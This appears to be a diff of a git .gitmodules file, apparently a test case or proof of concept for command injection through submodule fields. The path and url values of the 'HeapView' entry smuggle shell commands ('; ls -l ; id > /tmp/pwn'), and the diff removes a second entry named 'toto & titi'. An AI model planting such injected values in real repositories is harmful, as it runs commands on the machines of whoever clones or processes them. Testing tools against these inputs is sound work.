@@ -1,6 +1,3 @@
 [submodule "HeapView"]
 	path = HeapView;id > /tmp/pwn
 	url = http://github.com/polymorf/HeapView.git ; ls -l ; id > /tmp/pwn
-[submodule "toto & titi"]
-	path = toto
-	url = http://github.com/polymorf/HeapView.git
